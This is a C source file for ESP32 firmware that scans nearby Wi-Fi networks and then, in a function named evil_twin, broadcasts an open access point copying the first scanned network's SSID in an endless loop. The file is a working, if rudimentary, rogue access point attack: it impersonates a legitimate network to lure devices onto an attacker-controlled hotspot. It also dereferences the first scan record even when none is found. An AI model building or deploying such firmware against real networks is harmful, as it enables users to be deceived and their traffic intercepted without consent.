#include <string.h>
#include <stdio.h>
#include "sdkconfig.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "esp_system.h"
#include "esp_event.h"
#include "esp_err.h"
#include "esp_netif.h"
#include "nvs_flash.h"
#include "esp_wifi.h"
#include "esp_log.h"
#include <esp_wifi_types.h>

char * TAG = "debug";
char * AP_TAG = "AP";

typedef struct{
    wifi_ap_record_t *ap_records;
    uint16_t num_ap;
} Scan;

Scan scanner()
{
    esp_netif_create_default_wifi_sta();
    esp_wifi_set_mode(WIFI_MODE_STA);
    ESP_ERROR_CHECK(esp_wifi_start());

    wifi_scan_config_t scan_cfg = {
      .ssid = NULL,
      .bssid = NULL,
      .channel = 0,
      .show_hidden = false
    };
    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_cfg, true));
    ESP_ERROR_CHECK(esp_wifi_scan_stop());

    uint16_t num_ap;
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&num_ap));
    ESP_LOGI(AP_TAG, "%u APs found", num_ap);

    wifi_ap_record_t *ap_records = calloc(num_ap, sizeof(*ap_records));
    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&num_ap, ap_records));

    Scan ap_scan;
    ap_scan.ap_records = ap_records;
    ap_scan.num_ap = num_ap;
    ESP_ERROR_CHECK(esp_wifi_stop()); //wifi stopped to allow for switching between wifi modes
    esp_wifi_set_mode(WIFI_MODE_NULL);
    return ap_scan;


};

void evil_twin(wifi_ap_record_t clone_ap_record)
{
	ESP_ERROR_CHECK(esp_wifi_deinit());
	const wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); 
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_netif_create_default_wifi_ap();
	ESP_LOGI(AP_TAG, "Netif default ap created");
	ESP_LOGI(AP_TAG, "AP mode initialized");
	
	wifi_config_t wifi_ap_cfg = {
		.ap = {
			.ssid_len = strlen((char*)clone_ap_record.ssid),
			.channel = 1,
			.authmode = WIFI_AUTH_OPEN,
			.ssid_hidden = 0,
			.max_connection = 10,
			.beacon_interval = 100
		}
	};
	strcpy((char*)wifi_ap_cfg.ap.ssid, (char*)clone_ap_record.ssid);
		
	esp_wifi_set_mode(WIFI_MODE_AP);
	esp_wifi_set_config(WIFI_IF_AP, &wifi_ap_cfg );
    ESP_ERROR_CHECK(esp_wifi_start());
	

    while (true){
        vTaskDelay(10000/ portTICK_PERIOD_MS);
        ESP_LOGI(AP_TAG, "Broadcasting with %s...", (char*)wifi_ap_cfg.ap.ssid );
    };

    ESP_ERROR_CHECK(esp_wifi_stop()); //wifi stopped to allow for switching between wifi modes
    esp_wifi_set_mode(WIFI_MODE_NULL);


}

void app_main()
{
    nvs_flash_init(); 
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    const wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT(); 
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    Scan ap_scan = scanner();
    int rec = 0;
    for (rec = 0; rec < ap_scan.num_ap; rec++){ // iterate through each record to output found APs
        ESP_LOGI(AP_TAG, "%s", ap_scan.ap_records[rec].ssid);
    };

    wifi_ap_record_t * ap_records_ptr = ap_scan.ap_records;
    evil_twin(*ap_records_ptr);

}

